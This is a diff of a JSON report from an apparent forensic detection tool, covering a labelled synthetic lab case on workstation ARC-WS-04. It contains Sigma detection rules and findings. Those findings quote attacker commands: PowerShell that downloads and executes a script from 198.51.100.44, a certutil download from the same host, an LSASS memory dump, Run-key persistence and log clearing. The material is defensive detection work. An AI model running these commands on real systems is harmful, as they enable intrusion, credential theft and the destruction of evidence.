@@ -1,13 +1,15 @@
 {
   "case_id": "VESPER-CASE-2026-ARC04",
-  "case_title": "Archival Workstation ARC-WS-04 Compromise Investigation (Synthetic Laboratory Case)",
-  "generated_at": "2026-11-26T02:11:44.714377+00:00",
+  "case_title": "Archival Workstation ARC-WS-04 Investigation (Explicitly Labeled Synthetic Laboratory Case)",
+  "generated_at": "2026-11-26T03:57:42.909670+00:00",
   "historical_uemf_provenance": {
+    "artifact_id": "ART-HIST-UEMF-QCOW2",
     "artifact_name": "62EA0032-532F-447D-B4C8-B3D6D84C8AF2.qcow2",
-    "storage_classification": "Read-only historical UEMF academic evidence (external archive; not redistributed in repo)",
+    "source_classification": "historical_academic_artifact_readonly",
     "size_bytes": 30906007552,
     "verified_sha256": "d0ca8894ba0b9486093a1ca9275d97f389216aec84eaf731d9fe13e0130370d2",
-    "platform_constraint_documented": "Original UEMF Windows 11 ARM VM on Apple Silicon (UTM) encountered native Sysmon kernel driver incompatibility on ARM64; VESPER therefore separates this historical acquisition provenance from the reproducible laboratory case and runs live Windows PowerShell triage validation on x64 windows-latest CI."
+    "redistributed_in_repo": false,
+    "platform_constraint_documented": "Original UEMF Windows 11 ARM VM on Apple Silicon (UTM) encountered native Sysmon kernel driver incompatibility on ARM64; VESPER therefore separates this historical acquisition provenance from the reproducible synthetic laboratory case and runs live Windows PowerShell triage validation on x64 windows-latest CI."
   },
   "evidence_manifests": [
     {
@@ -16,7 +18,16 @@
       "size_bytes": 3219,
       "sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
       "records_parsed": 7,
-      "provenance": "laboratory_synthetic_archival_case"
+      "provenance": "synthetic_laboratory_case",
+      "artifact_id": "ART-SYN-001",
+      "source_classification": "synthetic_data",
+      "manifest_integrity_verified": true,
+      "expected_sha256": null,
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      }
     }
   ],
   "compiled_sigma_rules": [
@@ -30,7 +41,7 @@
         "attack.t1059.001"
       ],
       "splunk_spl": "source IN (\"WinEventLog:Microsoft-Windows-PowerShell/Operational\", \"WinEventLog:PowerShellCore/Operational\") EventCode=4104 ScriptBlockText IN (\"*Net.WebClient*\", \"*DownloadString*\", \"*DownloadFile*\", \"*Invoke-WebRequest*\", \"*iwr *\", \"*irm *\") ScriptBlockText=\"*Invoke-Expression*\"",
-      "elastic_lucene": "(winlog.channel:(Microsoft\\-Windows\\-PowerShell\\/Operational OR PowerShellCore\\/Operational)) AND ((winlog.event_data.source:(WinEventLog\\:Microsoft\\-Windows\\-PowerShell\\/Operational OR WinEventLog\\:PowerShellCore\\/Operational)) AND (winlog.event_data.EventCode:4104 AND (powershell.file.script_block_text:(*Net.WebClient* OR *DownloadString* OR *DownloadFile* OR *Invoke\\-WebRequest* OR *iwr\\ * OR *irm\\ *)) AND powershell.file.script_block_text:*Invoke\\-Expression*))"
+      "elastic_lucene": "(winlog.channel:(Microsoft\\-Windows\\-PowerShell\\/Operational OR PowerShellCore\\/Operational)) AND (event.code:4104 AND (powershell.file.script_block_text:(*Net.WebClient* OR *DownloadString* OR *DownloadFile* OR *Invoke\\-WebRequest* OR *iwr\\ * OR *irm\\ *)) AND powershell.file.script_block_text:*Invoke\\-Expression*)"
     },
     {
       "rule_id": "6d41c912-3b88-4e64-9a4a-55d204b8e201",
@@ -91,6 +102,56 @@
       ],
       "splunk_spl": "Image=\"*\\\\wevtutil.exe\" CommandLine IN (\"* cl *\", \"* clear-log *\")",
       "elastic_lucene": "process.executable.caseless:*\\\\wevtutil.exe AND (process.command_line:(*\\ cl\\ * OR *\\ clear\\-log\\ *))"
+    }
+  ],
+  "backend_parity_checks": [
+    {
+      "rule_file": "posh_ps_scriptblock_suspicious_download.yml",
+      "splunk_fields_present": true,
+      "elastic_ecs_fields_present": true,
+      "missing_splunk_fields": [],
+      "missing_elastic_ecs_fields": [],
+      "note": "Static pySigma compilation & field-mapping parity verified locally; live SIEM execution requires external Splunk/Elasticsearch clusters not bundled in this repo."
+    },
+    {
+      "rule_file": "proc_creation_win_certutil_download.yml",
+      "splunk_fields_present": true,
+      "elastic_ecs_fields_present": true,
+      "missing_splunk_fields": [],
+      "missing_elastic_ecs_fields": [],
+      "note": "Static pySigma compilation & field-mapping parity verified locally; live SIEM execution requires external Splunk/Elasticsearch clusters not bundled in this repo."
+    },
+    {
+      "rule_file": "proc_creation_win_lsass_dump_comsvcs.yml",
+      "splunk_fields_present": true,
+      "elastic_ecs_fields_present": true,
+      "missing_splunk_fields": [],
+      "missing_elastic_ecs_fields": [],
+      "note": "Static pySigma compilation & field-mapping parity verified locally; live SIEM execution requires external Splunk/Elasticsearch clusters not bundled in this repo."
+    },
+    {
+      "rule_file": "proc_creation_win_powershell_base64_encoded.yml",
+      "splunk_fields_present": true,
+      "elastic_ecs_fields_present": true,
+      "missing_splunk_fields": [],
+      "missing_elastic_ecs_fields": [],
+      "note": "Static pySigma compilation & field-mapping parity verified locally; live SIEM execution requires external Splunk/Elasticsearch clusters not bundled in this repo."
+    },
+    {
+      "rule_file": "registry_set_run_key_persistence.yml",
+      "splunk_fields_present": true,
+      "elastic_ecs_fields_present": true,
+      "missing_splunk_fields": [],
+      "missing_elastic_ecs_fields": [],
+      "note": "Static pySigma compilation & field-mapping parity verified locally; live SIEM execution requires external Splunk/Elasticsearch clusters not bundled in this repo."
+    },
+    {
+      "rule_file": "win_security_eventlog_cleared.yml",
+      "splunk_fields_present": true,
+      "elastic_ecs_fields_present": true,
+      "missing_splunk_fields": [],
+      "missing_elastic_ecs_fields": [],
+      "note": "Static pySigma compilation & field-mapping parity verified locally; live SIEM execution requires external Splunk/Elasticsearch clusters not bundled in this repo."
     }
   ],
   "regression_summary": {
@@ -221,9 +282,23 @@
   "verified_findings": [
     {
       "finding_id": "FND-001",
-      "classification": "VERIFIED_ARTIFACT_FINDING",
-      "timestamp": "2026-11-24T09:14:02Z",
+      "classification": "VERIFIED_SYNTHETIC_DATA_FINDING",
+      "artifact_id": "ART-SYN-001",
+      "source_file": "sample_incident_telemetry.json",
+      "source_classification": "synthetic_data",
+      "artifact_sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "manifest_integrity_verified": true,
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      },
+      "event_record_index": 1,
+      "windows_event_id": 1,
+      "original_timestamp": "2026-11-24T09:14:02Z",
+      "normalized_utc_timestamp": "2026-11-24T09:14:02+00:00",
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
       "rule_id": "4a3e218b-592b-426b-9442-1678d8a7c211",
+      "source_rule_file": "proc_creation_win_powershell_base64_encoded.yml",
       "title": "Suspicious PowerShell Base64 Encoded Command Execution",
       "severity": "HIGH",
       "mitre_tags": [
@@ -232,13 +307,28 @@
       ],
       "host": "ARC-WS-04",
       "user": "ARCHIVES\\j.moreau",
-      "evidence_summary": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
+      "observations": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+      "limitations": "Matched by VESPER's verified local Sigma subset on synthetic laboratory telemetry; live enterprise SIEM correlation and endpoint memory forensics are outside local scope."
     },
     {
       "finding_id": "FND-002",
-      "classification": "VERIFIED_ARTIFACT_FINDING",
-      "timestamp": "2026-11-24T09:15:10Z",
+      "classification": "VERIFIED_SYNTHETIC_DATA_FINDING",
+      "artifact_id": "ART-SYN-001",
+      "source_file": "sample_incident_telemetry.json",
+      "source_classification": "synthetic_data",
+      "artifact_sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "manifest_integrity_verified": true,
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      },
+      "event_record_index": 2,
+      "windows_event_id": 4104,
+      "original_timestamp": "2026-11-24T09:15:10Z",
+      "normalized_utc_timestamp": "2026-11-24T09:15:10+00:00",
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
       "rule_id": "f7299a38-5182-411a-bc04-89104081c991",
+      "source_rule_file": "posh_ps_scriptblock_suspicious_download.yml",
       "title": "Suspicious PowerShell Web Request & Memory Execution (Event ID 4104)",
       "severity": "HIGH",
       "mitre_tags": [
@@ -247,13 +337,28 @@
       ],
       "host": "ARC-WS-04",
       "user": "ARCHIVES\\j.moreau",
-      "evidence_summary": ""
+      "observations": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.44/stage.ps1')",
+      "limitations": "Matched by VESPER's verified local Sigma subset on synthetic laboratory telemetry; live enterprise SIEM correlation and endpoint memory forensics are outside local scope."
     },
     {
       "finding_id": "FND-003",
-      "classification": "VERIFIED_ARTIFACT_FINDING",
-      "timestamp": "2026-11-24T09:16:18Z",
+      "classification": "VERIFIED_SYNTHETIC_DATA_FINDING",
+      "artifact_id": "ART-SYN-001",
+      "source_file": "sample_incident_telemetry.json",
+      "source_classification": "synthetic_data",
+      "artifact_sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "manifest_integrity_verified": true,
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      },
+      "event_record_index": 3,
+      "windows_event_id": 1,
+      "original_timestamp": "2026-11-24T09:16:18Z",
+      "normalized_utc_timestamp": "2026-11-24T09:16:18+00:00",
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
       "rule_id": "b128f731-2943-4dc9-9832-72314ad31056",
+      "source_rule_file": "proc_creation_win_lsass_dump_comsvcs.yml",
       "title": "LSASS Memory Dump via Comsvcs DLL MiniDump",
       "severity": "CRITICAL",
       "mitre_tags": [
@@ -262,13 +367,28 @@
       ],
       "host": "ARC-WS-04",
       "user": "NT AUTHORITY\\SYSTEM",
-      "evidence_summary": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 656 C:\\Temp\\dump.bin full"
+      "observations": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 656 C:\\Temp\\dump.bin full",
+      "limitations": "Matched by VESPER's verified local Sigma subset on synthetic laboratory telemetry; live enterprise SIEM correlation and endpoint memory forensics are outside local scope."
     },
     {
       "finding_id": "FND-004",
-      "classification": "VERIFIED_ARTIFACT_FINDING",
-      "timestamp": "2026-11-24T09:17:04Z",
+      "classification": "VERIFIED_SYNTHETIC_DATA_FINDING",
+      "artifact_id": "ART-SYN-001",
+      "source_file": "sample_incident_telemetry.json",
+      "source_classification": "synthetic_data",
+      "artifact_sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "manifest_integrity_verified": true,
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      },
+      "event_record_index": 4,
+      "windows_event_id": 1,
+      "original_timestamp": "2026-11-24T09:17:04Z",
+      "normalized_utc_timestamp": "2026-11-24T09:17:04+00:00",
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
       "rule_id": "6d41c912-3b88-4e64-9a4a-55d204b8e201",
+      "source_rule_file": "proc_creation_win_certutil_download.yml",
       "title": "Suspicious Certutil Download Utility Execution",
       "severity": "HIGH",
       "mitre_tags": [
@@ -277,13 +397,28 @@
       ],
       "host": "ARC-WS-04",
       "user": "ARCHIVES\\j.moreau",
-      "evidence_summary": "certutil.exe -urlcache -split -f http://198.51.100.44/tool.bin C:\\Temp\\tool.bin"
+      "observations": "certutil.exe -urlcache -split -f http://198.51.100.44/tool.bin C:\\Temp\\tool.bin",
+      "limitations": "Matched by VESPER's verified local Sigma subset on synthetic laboratory telemetry; live enterprise SIEM correlation and endpoint memory forensics are outside local scope."
     },
     {
       "finding_id": "FND-005",
-      "classification": "VERIFIED_ARTIFACT_FINDING",
-      "timestamp": "2026-11-24T09:18:45Z",
+      "classification": "VERIFIED_SYNTHETIC_DATA_FINDING",
+      "artifact_id": "ART-SYN-001",
+      "source_file": "sample_incident_telemetry.json",
+      "source_classification": "synthetic_data",
+      "artifact_sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "manifest_integrity_verified": true,
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      },
+      "event_record_index": 5,
+      "windows_event_id": 13,
+      "original_timestamp": "2026-11-24T09:18:45Z",
+      "normalized_utc_timestamp": "2026-11-24T09:18:45+00:00",
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
       "rule_id": "c4e1837a-4299-4c8a-b941-89314981d77a",
+      "source_rule_file": "registry_set_run_key_persistence.yml",
       "title": "Persistence via Windows Registry Run Keys",
       "severity": "MEDIUM",
       "mitre_tags": [
@@ -292,13 +427,28 @@
       ],
       "host": "ARC-WS-04",
       "user": "ARCHIVES\\j.moreau",
-      "evidence_summary": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ArchiveSyncUpdater /d C:\\Temp\\tool.bin /f"
+      "observations": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ArchiveSyncUpdater /d C:\\Temp\\tool.bin /f",
+      "limitations": "Matched by VESPER's verified local Sigma subset on synthetic laboratory telemetry; live enterprise SIEM correlation and endpoint memory forensics are outside local scope."
     },
     {
       "finding_id": "FND-006",
-      "classification": "VERIFIED_ARTIFACT_FINDING",
-      "timestamp": "2026-11-24T09:21:30Z",
+      "classification": "VERIFIED_SYNTHETIC_DATA_FINDING",
+      "artifact_id": "ART-SYN-001",
+      "source_file": "sample_incident_telemetry.json",
+      "source_classification": "synthetic_data",
+      "artifact_sha256": "ab05e38e03ce45001c524e5cfa56ac2062e7812d756534251035bfb7d0b7a3ab",
+      "manifest_integrity_verified": true,
+      "acquisition_metadata": {
+        "method": "Curated synthetic laboratory telemetry JSON for reproducible DFIR testing",
+        "host_environment": "Offline laboratory fixture (not captured from a real compromised host)"
+      },
+      "event_record_index": 6,
+      "windows_event_id": 1,
+      "original_timestamp": "2026-11-24T09:21:30Z",
+      "normalized_utc_timestamp": "2026-11-24T09:21:30+00:00",
+      "parser": "vesper.evtx_ingestor.ingest_json_triage/2.0.0",
       "rule_id": "9b23e401-7f12-4c99-a771-1188a5520914",
+      "source_rule_file": "win_security_eventlog_cleared.yml",
       "title": "Windows Security or System Event Log Cleared via Wevtutil",
       "severity": "CRITICAL",
       "mitre_tags": [
@@ -307,21 +457,30 @@
       ],
       "host": "ARC-WS-04",
       "user": "NT AUTHORITY\\SYSTEM",
-      "evidence_summary": "wevtutil.exe cl Security"
+      "observations": "wevtutil.exe cl Security",
+      "limitations": "Matched by VESPER's verified local Sigma subset on synthetic laboratory telemetry; live enterprise SIEM correlation and endpoint memory forensics are outside local scope."
     }
   ],
   "analyst_hypotheses": [
     {
-      "hypothesis_id": "HYP-001",
+      "hypothesis_id": "HYP-EXEC-001",
       "classification": "ANALYST_HYPOTHESIS_UNCONFIRMED",
-      "statement": "Initial access may have originated from a phishing attachment opened under ARCHIVES\\j.moreau prior to T1059.001.",
+      "supported_by_findings": [
+        "FND-001",
+        "FND-002"
+      ],
+      "statement": "Encoded PowerShell activity observed on ARC-WS-04 (user context: ARCHIVES\\j.moreau) warrants checking upstream initial-access artifacts.",
       "required_corroboration": "Email gateway logs, browser download history, and NTFS Zone.Identifier ADS."
     },
     {
-      "hypothesis_id": "HYP-002",
+      "hypothesis_id": "HYP-CRED-002",
       "classification": "ANALYST_HYPOTHESIS_UNCONFIRMED",
-      "statement": "Credential material from LSASS dump (T1003.001) could have been staged for lateral movement before log clearing (T1070.001).",
-      "required_corroboration": "Domain controller Kerberos/NTLM Event ID 4624/4768 logs and network firewall flows."
+      "supported_by_findings": [
+        "FND-003",
+        "FND-006"
+      ],
+      "statement": "Co-occurrence of LSASS memory dump (T1003.001) and event log clearing (T1070.001) warrants checking for credential reuse or lateral movement.",
+      "required_corroboration": "Domain controller Kerberos/NTLM Event ID 4624/4768 logs and firewall flow records."
     }
   ]
 }
